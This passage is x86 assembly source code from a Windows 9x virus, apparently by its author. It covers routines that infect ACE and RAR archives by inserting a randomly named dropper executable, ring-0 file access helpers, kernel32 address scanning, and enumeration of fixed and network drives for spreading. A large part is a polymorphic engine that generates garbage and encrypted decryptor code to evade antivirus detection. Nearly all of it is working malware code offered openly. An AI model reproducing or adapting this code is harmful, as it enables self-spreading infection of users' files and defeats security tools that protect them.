           mov ebx,edi             ;save it

           lea esi,[edi+ACEf_TimeDate-ACE_file_start]
           call    __ar_is_infected
           jc  exit_now

           mov esi,edi
           movzx   edi,word ptr [esi+ACEf_HeadSize-ACE_file_start]
           add esi,4
           call    generate_CRC32
           mov [ebx+ACEf_HeadCRC-ACE_file_start],ax

           mov edx,[ebp+archive_header_first-virus_start]  ;What We Wanna Write (4xW)
           mov esi,[ebp+header_filepos-virus_start]
           mov ebx,[ebp+file_handle-virus_start]
           mov ecx,[ebp+archive_read_length-virus_start]
           call    fwrite          ;write ACE header

           lea edi,[ebp+ACEf_Filename-virus_start]
           call    generate_name       ;name of dropper
           mov word ptr [ebp+ACEf_FilenameSize-virus_start],ax
           mov bx,ACE_without_filename
           add bx,ax
           mov word ptr [ebp+ACEf_HeadSize-virus_start],bx

           mov eax,[ebp+dropper_size-virus_start]
           mov [ebp+ACEf_CompressedSize-virus_start],eax
           mov [ebp+ACEf_UnCompressedSize-virus_start],eax

           movzx   edi,word ptr [ebp+ACEf_FilenameSize-virus_start]
           add edi,ACEf_Filename - ACEf_HeadType
           lea esi,[ebp+ACEf_HeadType-virus_start]
           call    generate_CRC32
           mov word ptr [ebp+ACEf_HeadCRC-virus_start],ax

           mov esi,[ebp+dta.dta_filesize-virus_start]
           lea edx,[ebp+ACEf_HeadCRC-virus_start]  ;start of ACE file header
           movzx   ecx,word ptr [ebp+ACEf_FilenameSize-virus_start]
           add ecx,ACE_file_length ;size of ACE file header
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite          ;write ACE file header
           jc  exit_now

           add esi,ecx
           mov edx,[ebp+dropper_memory-virus_start]
           mov ecx,[ebp+dropper_size-virus_start]
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite

       exit_now:
       exit_now_6:
           bt  word ptr [ebp+errors-virus_start],6
           jnc exit_now_5
           mov eax,[ebp+dropper_memory-virus_start]
           call    mdealloc
       exit_now_5:
           bt  word ptr [ebp+errors-virus_start],5
           jnc exit_now_4
           mov ebx,[ebp+dropper_handle-virus_start]
           call    fclose
       exit_now_4:
           bt  word ptr [ebp+errors-virus_start],4
           jnc exit_now_3
           mov ebx,[ebp+file_handle-virus_start]
           call    fclose
       exit_now_3:
           bt  word ptr [ebp+errors-virus_start],3
           jnc exit_now_2
           mov eax,[ebp+archive_header_first-virus_start]
           call    mdealloc
       exit_now_2:
           bt  word ptr [ebp+errors-virus_start],2
           jnc exit_now_1
           mov edx,[ebp+filename_ptr-virus_start]
           mov ecx,[ebp+dta.dta_fileattr-virus_start]
           call    fsetattr        ;restore attribs
       exit_now_1:
           bt  word ptr [ebp+errors-virus_start],1
           jnc exit_now_0
           mov eax,[ebp+Archive_Buffer-virus_start]
           call    mdealloc
       exit_now_0:
           bt  word ptr [ebp+errors-virus_start],0
           ret

       __iluzo_return_7:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ infection in RAR archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
   ;
   ;   input:  eax=dropper file CRC
   ;       ebx=RAR_Archive
   ;       edi=filepos of header in file
   ;

   infect_RAR:

           mov [ebp+RAR_FileCRC-virus_start],eax

           call    __ar_load_header

           test    word ptr [edx+RAR_FileFlags-RAR_header_start+RAR_MagicSize],1
           jnz exit_now            ;mult. volume ?

           movzx   edi,word ptr [edx+RAR_HeaderSize-RAR_header_start+RAR_MagicSize]
           add edi,RAR_MagicSize
           add edi,edx             ;absolute start in memory
           mov ebx,edi             ;save it

           lea esi,[edi+RAR_TimeDate-RAR_header_start]
           call    __ar_is_infected
           jc  exit_now

           mov esi,edi
           movzx   edi,word ptr [esi+RAR_HeaderSize-RAR_header_start]
           add esi,2
           sub edi,2
           call    generate_CRC32
           mov [ebx+RAR_HeaderCRC-RAR_header_start],ax

           mov edx,[ebp+archive_header_first-virus_start]
           mov esi,[ebp+header_filepos-virus_start]
           mov ebx,[ebp+file_handle-virus_start]
           mov ecx,[ebp+archive_read_length-virus_start]
           call    fwrite          ;write RAR header

           lea edi,[ebp+RAR_Filename-virus_start]
           call    generate_name       ;name of dropper
           mov word ptr [ebp+RAR_FilenameSize-virus_start],ax
           mov bx,RAR_file_length
           add bx,ax
           mov word ptr [ebp+RAR_HeaderSize-virus_start],bx

           mov eax,[ebp+dropper_size-virus_start]
           mov [ebp+RAR_CompressedSize-virus_start],eax
           mov [ebp+RAR_UnCompressedSize-virus_start],eax

           movzx   edi,word ptr [ebp+RAR_FilenameSize-virus_start]
           add edi,RAR_without_filename
           lea esi,[ebp+RAR_HeaderType-virus_start]
           call    generate_CRC32
           mov word ptr [ebp+RAR_HeaderCRC-virus_start],ax

           mov esi,[ebp+dta.dta_filesize-virus_start]
           lea edx,[ebp+RAR_HeaderCRC-virus_start] ;start of RAR file header
           movzx   ecx,word ptr [ebp+RAR_FilenameSize-virus_start]
           add ecx,RAR_file_length ;size of RAR file header
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite          ;write RAR file header
           jc  exit_now

           add esi,ecx
           mov edx,[ebp+dropper_memory-virus_start]
           mov ecx,[ebp+dropper_size-virus_start]
           mov ebx,[ebp+file_handle-virus_start]
           call    fwrite

           jmp exit_now

   ;ÄÄÄ´ other common functionz for ACE/RAR archivez ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;Allocate memory and load header of ACE or RAR header there
           ;
       __ar_load_header:
           mov eax,50*ACE_header_needed
           call    malloc
           mov [ebp+archive_header_first-virus_start],eax
           or  word ptr [ebp+errors-virus_start],1000b

           mov edx,eax             ;new place in memory
           mov ebx,[ebp+file_handle-virus_start]
           mov esi,edi             ;file pos
           mov ecx,50*ACE_header_needed    ;size of header
           call    fread               ;read header
           mov [ebp+archive_read_length-virus_start],ecx
           ret

           ;---------------------------------------------------------
           ;Test if archive file is infected if not generate new
           ;number which is divided 85 and write its to esi
           ;
           ;   input:  esi=where i'll write TimeDate
           ;   output: cf
           ;
       __ar_is_infected:
           mov eax,[esi]       ;TimeDate to eax
           xor edx,edx         ;is divided 85 ?
           mov ecx,85
           div ecx
           or  edx,edx
           jz  __ar_ii_exit

           mov eax,03030302h       ;set new TimeDate
           call    ppe_get_rnd_range
           inc eax
           imul    eax,85
           mov edx,[ebp+archive_header_first-virus_start]
           mov [esi],eax       ;write new TimeDate
           clc
           ret
       __ar_ii_exit:
           stc
           ret

       ;-----------------------------------------------------------------
       ;This function serves for find the starting header of archive ACE
       ;or RAR. The archive is scanning from designate place to find out
       ;the starting  header  of SFX files. In DOS' SFX is on some place
       ;but in ACE-SFX is this border variable (in RAR-SFX not). Version
       ;of ACE-SFX exists in English  and  German but their size is same
       ;
       ;   input:      none
       ;   output:     cf=1 or EAX=CRC32 of file
       ;               EBX=ACE_Archive or RAR_Archive
       ;               EDI=header file pos
       ;               file NOT closed
       ;               dropper_memory is NOT deallocate
       ;
       dropper_handle  dd  ?   ;file handle of Archive_Filename
       dropper_memory  dd  ?   ;where is dropper placed ?
       dropper_size    dd  ?   ;size of a dropper
       header_filepos  dd  ?   ;where's header ?
       where_magic dd  ?   ;where's magic of ACE/RAR archive ?
       dest_filepos    dd  ?   ;dest. file filepos
       ;
   prepare_file:

           cmp dword ptr [ebp+Archive_Filename_Sz-virus_start],0
           jz  pfile_exit      ;is any file prepare ?

           mov edx,[ebp+filename_ptr-virus_start]
           call    fopen
           jc  pfile_exit      ;open file
           mov [ebp+file_handle-virus_start],eax
           or  word ptr [ebp+errors-virus_start],10000b

           mov eax,Archive_BufSize ;allocate memory to
           call    malloc          ;calculate CRC32
           mov dword ptr [ebp+Archive_Buffer-virus_start],eax
           or  word ptr [ebp+errors-virus_start],10b

           mov byte ptr [ebp+Archive_Number-virus_start],7
           mov eax,7           ;but we have -6- places
       pfile_next_find:
           movzx   eax,byte ptr [ebp+Archive_Number-virus_start]
           dec eax
           jz  pfile_exit
           mov byte ptr [ebp+Archive_Number-virus_start],al
           lea ebx,[ebp+Archive_MagicWhere-virus_start]
       pfile_magic_ok:
           imul    eax,4           ;and how many bytes to read
           add ebx,eax
           sub ebx,ebp
           movzx   ecx,word ptr [ebp+ebx-2]    ;ecx=bytes to read
           movzx   esi,word ptr [ebp+ebx-4]    ;esi=file pos
           mov [ebp+dest_filepos-virus_start],esi

           mov edx,[ebp+Archive_Buffer-virus_start]    ;buffer
           mov ebx,[ebp+file_handle-virus_start]   ;file handle
           call    fread                   ;i can't check error !

           mov edi,[ebp+Archive_Buffer-virus_start]    ;prepare to scan
           mov ebx,edi
           add ebx,ecx
       pfile_search_again:
           cmp edi,ebx         ;are we far then we can ?
           ja  pfile_next_find

           lea esi,[ebp+RAR_Magic-virus_start] ;no, esi=RAR_Magic
           mov ecx,RAR_MagicSize       ;and his size
           cmp byte ptr [ebp+Archive_Number-virus_start],4
           jae pfile_search            ;is it really RAR ?
           lea esi,[ebp+ACE_Magic-virus_start] ;set esi=ACE_Magic
           mov ecx,ACE_MagicSize       ;and his size
       pfile_search:
           cld
           rep cmpsb           ;compare magic
           jnz pfile_search_again  ;shit, we must search on other place

           sub edi,edx         ;edi=place before magic

           sub edi,RAR_MagicSize
           cmp byte ptr [ebp+Archive_Number-virus_start],4
           jae pfile_read
           sub edi,ACE_BeforeMagic+ACE_MagicSize-RAR_MagicSize
       pfile_read:
           add edi,[ebp+dest_filepos-virus_start]
           mov [ebp+header_filepos-virus_start],edi    ;file pos of header !!

           lea edx,[ebp+Archive_Filename-virus_start]
           call    fopen
           jc  pfile_exit      ;nooooo, fucking jump !
           mov [ebp+dropper_handle-virus_start],eax
           or  word ptr [ebp+errors-virus_start],100000b

           mov ebx,eax         ;handle to ebx
           call    fgetsize        ;i know i can use Archive_Filename_Sz but it can be change !
           mov [ebp+dropper_size-virus_start],eax
           call    malloc          ;eax=file size
           mov [ebp+dropper_memory-virus_start],eax
           or  word ptr [ebp+errors-virus_start],1000000b

           xor esi,esi
           mov edx,eax         ;edx=place in memory
           mov ebx,[ebp+dropper_handle-virus_start]
           mov ecx,[ebp+dropper_size-virus_start]  ;size of a file
           call    fread
           jc  pfile_exit

           mov edi,ecx
           mov esi,[ebp+dropper_memory-virus_start]
           call    generate_CRC32

           jmp pfile_quit
       pfile_exit:
           xor eax,eax
       pfile_quit:
           mov ebx,RAR_Archive
           cmp byte ptr [ebp+Archive_Number-virus_start],4
           jae pfile_RAR_quit
           mov ebx,ACE_Archive
       pfile_RAR_quit:
           mov edi,[ebp+header_filepos-virus_start]
           or  eax,eax
           ret

       ;-----------------------------------------------------------------
       ;this code was extracted from Vecna's Inca virus, thx2Vecna
       ;
   generate_CRC32:
           cld
           push    ebx
           mov ecx, -1
           mov edx, ecx
       NextByteCRC:
           xor eax, eax
           xor ebx, ebx
           lodsb
           xor al, cl
           mov cl, ch
           mov ch, dl
           mov dl, dh
           mov dh, 8
       NextBitCRC:
           shr bx, 1
           rcr ax, 1
           jnc NoCRC
           xor ax, 08320h
           xor bx, 0edb8h
       NoCRC:
           dec dh
           jnz NextBitCRC
           xor ecx, eax
           xor edx, ebx
           dec di
           jnz NextByteCRC
           cmp byte ptr [ebp+Archive_Number-virus_start],4
           jb  ACE_CRC
           not edx
           not ecx
       ACE_CRC:
           pop ebx
           mov eax, edx
           rol eax, 16
           mov ax, cx
           ret

       ;-----------------------------------------------------------------
       ;input: edi=where put new name (maximum=8+1+3)
       ;out:    al=filename length
       ;
   generate_name:  pusha
           cld
           lea esi,[ebp+gen_archive_filename-virus_start]
           mov eax,gen_archive_number
           call    ppe_get_rnd_range
           mov ecx,eax
       name_search:
           jecxz   name_found
           movzx   eax,byte ptr [esi+1]
           add eax,2
           add esi,eax
           dec ecx
           jmp name_search
       name_found:
           mov ebx,edi
           mov al,byte ptr [esi]
           call    gen_spec_char
       no_gen_1:
           movzx   ecx,byte ptr [esi+1]
           inc esi
           inc esi
           rep movsb

           call    gen_spec_char
           mov eax,'exe.'
           mov [edi],eax
           add edi,4
           mov edx,edi
           sub edx,ebx

           mov ecx,8+1+3
           sub ecx,edx
           xor al,al
           rep stosb

           mov [esp].access_eax,edx
           popa
           ret

       gen_spec_char:
           or  al,al
           jz  char_exit
           mov eax,00000002h
           call    ppe_get_rnd_range
           or  al,al
           jz  char_exit
           mov byte ptr [edi],'!'
           inc edi
       char_exit:
           ret

       __iluzo_return_8:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ functionz for file access ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;input:     edx=filename
           ;output:    cf, eax=file handle
   fopen:      pusha
           mov eax,R0_OPENCREATFILE
           mov esi,edx
           mov ebx,2022h   ;no int 24h, r/w
           mov ecx,32      ;file attrib
           mov edx,1       ;fail | open
           VxDCall IFSMGR_Ring0_FileIO
           mov [esp].access_eax,eax
           popa
           ret

           ;input:     ebx=file handle
   fclose:     pusha
           mov eax,R0_CLOSEFILE
           VxDCall IFSMGR_Ring0_FileIO
           popa
           ret

           ;input:     ebx=file handle
           ;       edx=buffer
           ;       ecx=size
           ;       esi=file pos
           ;output:    cf, ecx=bytes read
   fread:      pusha
           mov eax,R0_READFILE
           xchg    edx,esi
           VxDCall IFSMGR_Ring0_FileIO
           mov [esp].access_ecx,eax
           cmp eax,ecx         ;set cf flag (if eax<>ecx cf=1 else cf=0)
           popa
           ret

           ;input:     ebx=file handle
           ;       edx=buffer
           ;       ecx=size
           ;       esi=file pos
           ;output:    cf, ecx=bytes written
   fwrite:     pusha
           mov eax,R0_WRITEFILE
           xchg    edx,esi
           VxDCall IFSMGR_Ring0_FileIO
           mov [esp].access_ecx,eax
           cmp eax,ecx
           popa
           ret

           ;input:     ecx=fileattr
           ;       edx=filename
   fsetattr:   pusha
           mov eax,R0_FILEATTRIBUTES+SET_ATTRIBUTES
           mov esi,edx
           VxDCall IFSMGR_Ring0_FileIO
           popa
           ret

           ;input:     ebx=file handle
           ;output:    cf, eax=file size
   fgetsize:   pusha
           mov eax,R0_GETFILESIZE
           VxDCall IFSMGR_Ring0_FileIO
           mov [esp].access_eax,eax
           popa
           ret

           ;input:     ecx=attribs
           ;       edx=filemask
           ;       esi=dta
           ;output:    cf, eax=handle
   ffindfirst: pusha
           mov eax,R0_FINDFIRSTFILE    ;kind of function
           xchg    edx,esi         ;edx=dta struct
           VxDCall IFSMGR_Ring0_FileIO
           mov [esp].access_eax,eax    ;result to pusha(eax)
           popa
           ret

           ;input:     eax=handle
           ;       esi=dta
           ;output:    cf
   ffindnext:  pusha
           xchg    ebx, eax
           mov eax, R0_FINDNEXTFILE    ;kind of function
           mov edx, esi        ;edx=dta stuct
           VxDCall IFSMGR_Ring0_FileIO
           mov [esp].access_eax, eax
           popa
           ret

           ;input:     eax=handle
   ffindclose: pusha
           xchg    eax,ebx         ;file handle to ebx
           mov eax,R0_FINDCLOSEFILE    ;kind of function
           VxDCall IFSMGR_Ring0_FileIO
           popa
           ret

   malloc:     pusha
           push    201h
           push    eax
           VMMCall HeapAllocate
           add esp,8
           mov [esp].access_eax,eax
           or  eax,eax
           popa
           ret

   mdealloc:   pusha
           push    0
           push    eax
           VMMCall HeapFree
           add esp,8
           popa
           ret

       __iluzo_return_9:           ;find "g_iluzo_return" text
           ret             ;in this file for more infoz

   ;ÄÄÄ´ function to get kernel's address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   find_kernel32:
           mov eax,[esp+4]     ;I need kernel's address
           and eax,0FFFF0000h      ;'cause of GetDriveType
           add eax,65536       ;function
       __scanning: sub eax,65536
           cmp word ptr [eax],'ZM'
           jnz __scanning
           pusha
           mov [ebp+kernel_base-virus_start],eax
           mov edx,eax

           ; kernel's base 'MZ' address in EAX
           mov ebx,eax
           add eax,[eax+3ch]
           add ebx,[eax+78h]

           ; GetProcAddress
           lea eax,[ebp+gpa-virus_start]
           mov dword ptr [ebp+__sET_sz -virus_start],15
           mov dword ptr [ebp+__sET_str-virus_start],eax
           call    __searchET
           mov ebx,eax

           ; GetDriveType address
           @pushsz "GetDriveTypeA"
           push    dword ptr [ebp+kernel_base-virus_start]
           mov eax,ebx         ;GetProcAddress
           call    eax
           mov [ebp+pGetDriveType-virus_start],eax

           popa
           ret

           ; search function's address
       __searchET:
           mov eax,[ebx+32]        ;search export table of
           add eax,edx         ;KERNEL32, searching the
       __sET_next:
           mov esi,[eax]       ;the names, then the ordinal
           add esi,edx         ;and, finally the RVA pointerz
           mov edi,12345678h
       __sET_str equ dword ptr $-4
           mov ecx,12345678h
       __sET_sz  equ dword ptr $-4
           rep cmpsb
           jz  __sET_found
           add eax,00000004h
           jmp __sET_next
       __sET_found:
           sub eax,[ebx+32]
           sub eax,edx
           shr eax,1
           add eax,[ebx+36]
           add eax,edx
           movzx   eax,word ptr [eax]
           shl eax,2
           add eax,[ebx+28]
           add eax,edx
           mov eax,[eax]
           add eax,edx
           ret

   ;ÄÄÄ´ search fixed, cd-rom, ram-disk, etc. ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function gets informations about disks. I call
           ;GetDriveType function to get type of disk. You can use
           ;Win32API Help to know more or WinBase.H (by CBuilder, MSVC)
           ;where you can see more flagz and their values. So, I can
           ;use GetLogicalDrives function, but that's one. Maybe you
           ;can say: "Why he will not check it in ring-0 ?". Because
           ;I don't know how. I tried to debug some VxD functions as
           ;is IFSFN_Ring0GetDriveInfo, but I haven't any flagz if
           ;DISK_FIXED is really 0x41 value or not (debug to know more).
           ;And if you want, try to debug IFSFN_Get_Drive_Info and
           ;there's only RET instruction :)
           ;
   get_disks:

           pusha
           xor ebx,ebx
           mov byte ptr [ebp+__disk-virus_start],'A'

           ; GetDriveType function...
       __gd_search:
           lea eax,[ebp+__disk-virus_start]
           push    eax
           mov eax,[ebp+pGetDriveType-virus_start]
           call    eax

           cmp eax,00000003h       ;DISK_FIXED flag
           jz  __gd_found
           cmp eax,00000004h       ;DISK_REMOTE (network) flag
           jz  __gd_found

       __gd_new_disk:
           cmp byte ptr [ebp+__disk-virus_start],'Z'
           jz  __gd_finish
           inc byte ptr [ebp+__disk-virus_start]
           jmp __gd_search

       __gd_found:
           mov cl,'A'
           sub cl,byte ptr [ebp+__disk-virus_start]
           neg cl
           mov eax,00000001h
           shl eax,cl          ;convert to BCD
           or  ebx,eax
           jmp __gd_new_disk

       __gd_finish:
           mov [ebp+gdt_flags-virus_start],ebx
           popa
           ret

       __disk:
           db  'A:\',0

   ;ÄÄÄ´ Prizzy Polymorphic Engine (PPE) ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;Welcome to my Prizzy Polymorphic Engine (PPE).
           ;
           ;I would like to thank GriYo/29A because I understood
           ;principle of the polymorphic's tables. In return I coded
           ;many interesting function with Coprocessor and MMX.
           ;
           ;Total instructions which I can generate are:
           ;   * 149 type of base-instructions (37 from GriYo/29A)
           ;   * 43  type of copro-instructions
           ;   * 46  type of MMX-instructions
           ;
           ;     base-instr      copro-instr       MMX-instr
           ;    ------------    -------------         -----------
           ; (clc,stc,cmc,cld...)  (fst,fist w/d/q...)  (movd,movq,...)
           ; mov reg(32,16,8),imm  (fld,fild w/d/q...)  (packssdw  ...)
           ; mov reg(32,16,8),reg  (fldl2t,fldl2e ...)  (punpckhbw ...)
           ; (add,sub...) reg,imm  (fadd,fiadd w/d/q.)  (pcmpeqb   ...)
           ; (xor,adc...) reg,reg  (fsub,fisub w/d/q.)  (psrlw,psrrlq.)
           ; push + garbage + pop  (fsin,fcos,fpatan.)  (psraw,psrad..)
           ; call + garbage + pop  (fabs,fnop,fxch...)  (psllw,psslq..)
           ; jmp + rnd_data    (ftst,fxam,fsqrt..)  (pand,pxor ...)
           ; jmp conditional                (pmaddwd   ...)
           ; mov(sx.zx) reg,reg                 (paddb,paddd..)
           ; (rcr,sal...) reg,imm               (paddsb    ...)
           ; (rol,shr...) reg,reg               (paddusw   ...)
           ; (bsf,bsr...) reg,imm               (psubb,psubd..)
           ; (btc,bts...) reg,reg               (psubsw    ...)
           ; (seta,setp,setg ...)               (psubusw   ...)
           ; garbage + (loope...)
           ; garbage + dec + jnz
           ; gen reg + cjmp reg32
           ; gen reg + rep(lods.)
           ; push val+garbage+pop
           ; gen rnd32 + crypt     this is only part of reality ...
           ;
           ; I can generate garbage instructions which they will not
           ; modify flags (useful for MMX and JNZ work).
           ;
           ; I did function which can crypt a original value in reg32.
           ; for example: I can get 0x12345678 value to ESI, it will
           ; be crypted :      MOV     EAX, 38C407D6h
           ;           ADD     EAX, C73Bf82Ah
           ;           MOV     EDX, EAX
           ;           NOT     EDX
           ;           MOV     ESI, EDX
           ;           XOR     ESI, 7FD02C6Ah -> ESI=12345678h
           ;
           ; The very interesting is test which I find out if computer
           ; supports MMX - and it'll get over CPUID - and supports one ?
           ;
           ; Also I don't know if I must inicialize coprocessor or MMX
           ; but when I was debugging WinAMP plugins, he DO NOT inicia-
           ; lize ones. So I think it isn't necessary - believe me.
           ; But now, two days later, I find out that SoftICE wants
           ; inicialized these regs.
           ;
           ; And finally my awful shock. I found out If I have got a
           ; qword value in copro-reg and I wanna read dword via FILD,
           ; copro put to memory 0x80000000 value instead low-dword
           ; value - although I hooped in. But what can I do with it ?
           ; In the end I had to REMOVE code-operation through copro.
           ; I don't know how else to solve this problem - try it !
           ;
           ; I hope the comments are enough to guide you through...
           ;
           __ppe_st_flags   dw ?   ;input of tbl_encode_loop
           __ppe_st_items   db ?   ;items in table
           __ppe_st_o_table dd ?   ;offset to the table (part)
           ;
   ppe_startup:

           cld
           pusha

           ; clear table of registers (base/copro/mmx)
           mov byte ptr [ebp+used_regs-virus_start],00000000b
           mov byte ptr [ebp+used_regs_mmx-virus_start],00000000b
           mov byte ptr [ebp+used_regs_copro-virus_start],00000000b

           mov byte ptr [ebp+recursive_level-virus_start],00h
           mov byte ptr [ebp+recursive_lmmx -virus_start],00h
           mov dword ptr[ebp+counter_back   -virus_start],-1

           mov byte ptr [ebp+compare_index-virus_start],00h
           mov byte ptr [ebp+index_reg_get-virus_start],00h

           ; set style of the garbages
           mov byte ptr [ebp+garbage_style-virus_start], \
               USED_BASED or USED_FLAGS or USED_COPRO or USED_MMX

           ; copy the body of our virus to buffer
           mov esi,ebp
           mov edi,[ebp+mem_address-virus_start]
           mov ecx,file_size
           rep movsb

           ; load address of the start of poly-decoder
           mov edi,[ebp+poly_start-virus_start]

           ; clear table
           xor ebx,ebx
           mov ecx,00000006h
           lea esi,[ebp+tbl_encode_loop-virus_start]
       __ppes_clear_table:
           lodsw
       __ppes_clear_item:
           mov dword ptr [esi],ebx
           add esi,00000008h
           dec al
           jnz __ppes_clear_item
           dec ecx
           jnz __ppes_clear_table

           ; I'm gonna write a flag which will be mean that global
           ; index reg ain't generated yet.
           mov byte ptr [ebp+gl_index_reg-virus_start],-1

           ; index_reg/code_reg/counter_reg will in copro or mmx ?
       __ppes_new_style:
            mov     al,[ebp+used_regs-virus_start]
            push    eax
            call    ppe_get_rnd32
            and     al,1
            mov     [ebp+copro_or_mmx-virus_start],al

           ; get index_reg --> (xor,sub...) [index_reg], reg32
       __ppes_new_ireg:
           call    ppe_get_valid_reg
           or  al,al
           jnz __ppes_test_reg
           movzx   ebx,ah
           lea ebx,[ebp+tbl_regs+ebx*02h-virus_start]
           test    byte ptr [ebx+REG_FLAGS],REG_NO_COPRO
           jnz __ppes_new_ireg
       __ppes_test_reg:
           mov [ebp+index_reg-virus_start],al
           mov [ebp+index_reg_place-virus_start],ah
           call    ppe_set_valid_reg

           ; get code_reg --> (xor,sub...) [---], code_reg
           call    ppe_get_empty_reg
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah
           mov byte ptr [ebp+code_reg-virus_start],0
           mov [ebp+code_reg_place-virus_start],al

           ; get counter_reg --> dec counter_reg, jnz ...
           call    ppe_get_valid_reg
           mov [ebp+counter_reg-virus_start],al
           mov [ebp+counter_reg_place-virus_start],ah
           call    ppe_set_valid_reg

           ; 'cause we have few registers I can't have got all idx in base
           pop eax
           cmp byte ptr [ebp+index_reg-virus_start],0
           jnz __ppes_okay
           cmp byte ptr [ebp+counter_reg-virus_start],0
           jnz __ppes_okay
           mov [ebp+used_regs-virus_start],al
           jmp __ppes_new_style
       __ppes_okay:

           ; choose subroutine
           xor ebx,ebx
           mov ecx,00000006h
           lea esi,[ebp+tbl_encode_loop-virus_start]
       __ppes_choose:
           lodsw               ;AH=random?, AL=items
           mov [ebp+__ppe_st_flags  -virus_start],ax
           mov [ebp+__ppe_st_items  -virus_start],al
           mov [ebp+__ppe_st_o_table-virus_start],esi
           or  ah,ah           ;random ? JZ if not
           jnz __ppes_crun
       __ppes_cnext:
           mov esi,[ebp+__ppe_st_o_table-virus_start]
           movzx   eax,byte ptr [ebp+__ppe_st_items-virus_start]
           call    ppe_get_rnd_range
           push    eax
           imul    eax,00000008h
           cmp dword ptr [esi+eax],00000000h
           pop eax
           jnz __ppes_cnext
           imul    eax,00000008h
           add esi,eax
       __ppes_crun:
           lodsd               ;already generated byte...
           lodsd
           add eax,ebp
           sub eax,offset virus_start
           call    eax
           mov dword ptr [esi-8],1 ;already generated flag
           dec byte ptr [ebp+__ppe_st_flags-virus_start]
           jz  __ppes_ccmp
           cmp byte ptr [ebp+__ppe_st_flags-virus_start+1],0
           jz  __ppes_cnext
           jmp __ppes_crun
       __ppes_ccmp:
           mov esi,[ebp+__ppe_st_o_table-virus_start]
           movzx   eax,byte ptr [ebp+__ppe_st_items-virus_start]
           imul    eax,00000008h
           add esi,eax
           dec ecx
           jnz __ppes_choose

           ; finishing (PPE)...
           mov eax,edi
           sub eax,[ebp+poly_start-virus_start]
           add eax,file_size
           mov [ebp+poly_finish-virus_start],eax

           popa
           ret

   ;ÄÄÄ´ generate code which will detect mmx support ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function is one of the most important during build
           ;the poly-decoder etc. The first, then we'll begin generate
           ;garbage, we must test MMX - meanwhile we can generate
           ;no copro/mmx garbage - as is jumps+move+math and so on.
           ;
   ppe_get_cpuid_mmx:

           ; we can't generate copro & MMX instruction
           ; because we don't if CPU supports MMX and because we
           ; don't have generated a global index register for copro
           call    gen_garbage_based
           call    gen_garbage_based

           call    __cpuid_mmx

           ret

   ;ÄÄÄ´ function to clear copro and mmx regs ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;Haha, this function is here only for it that SoftICE had
           ;some problems. The say I must clear coprocessor then I'll
           ;begin use copro-instructions. BUT ! I find out WinAMP also
           ;don't clear them. So, I don't know - but never mind.
           ;
   ppe_copro_mmx_clear:

           ; save registers
           pusha
           call    gen_garbage_based

           ; test, if MMX is support
           mov al,0
           call    __mmx_test_start

           call    gen_garbage_based
           mov ax,770Fh        ;EMMS instruction
           stosw
           call    gen_garbage_based

           call    __mmx_test_finish

           ; reset copro-regs
           call    gen_garbage_based
           mov ax,0E3DBh       ;FNINIT instruction
           stosw

           ; bye, bye
           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ generate code to get delta-address ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

           ;---------------------------------------------------------
           ;This function get -actual- address of poly-loop.
           ;
           __ppe_gd_call    dd  ?
           ;
   ppe_get_delta:

           ; save registers
           pusha

           ; generate garbage but i don't copro !
           call    gen_garbage_based
           call    gen_garbage_based

           ; prepare CALL
           mov al,0E8h
           stosb
           stosd
           mov [ebp+__ppe_gd_call-virus_start],edi
           push    edi
           call    ppe_gen_rnd_block
           mov eax,edi
           pop esi
           sub eax,esi
           mov dword ptr [esi-00000004h],eax

           call    gen_garbage_based

           ; now, we must choose a global index register
           call    ppe_get_empty_reg
           mov [ebp+gl_index_reg-virus_start],al
           call    __reg_to_bcd
           or  [ebp+used_regs-virus_start],ah

           mov al,58h
           or  al,byte ptr [ebp+gl_index_reg-virus_start]
           stosb               ;POP base-reg32
           call    gen_garbage_no_flags    ;'cause delta isn't finished

           ; we must fix real address
           mov eax,[ebp+__ppe_gd_call-virus_start]
           sub eax,[ebp+mem_address-virus_start]
           sub eax,file_size
           push    eax

           ; ADD or SUB ?
           call    ppe_get_rnd32
           and al,1
           jz  __ppe_gd_sub

           ; fix with ADD --> add reg32, fix_value
           mov ax,0C081h
           or  ah,byte ptr [ebp+gl_index_reg-virus_start]
           stosw
           pop eax
           neg eax
           jmp __ppe_gd_fix_done

           ; fix with SUB --> sub reg32, -fix_value
       __ppe_gd_sub:
           mov ax,0E881h
           or  ah,byte ptr [ebp+gl_index_reg-virus_start]
           stosw
           pop eax

       __ppe_gd_fix_done:
           stosd

           mov [esp],edi
           popa
           ret

   ;ÄÄÄ´ generate code to set index for decode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

   ppe_get_index:

           ; save registers
           pusha
           call    gen_garbage

           ; save used-regs
           mov al,[ebp+used_regs-virus_start]
           push    ax

           ; crypt a start of decoding
           mov eax,file_size
           neg eax
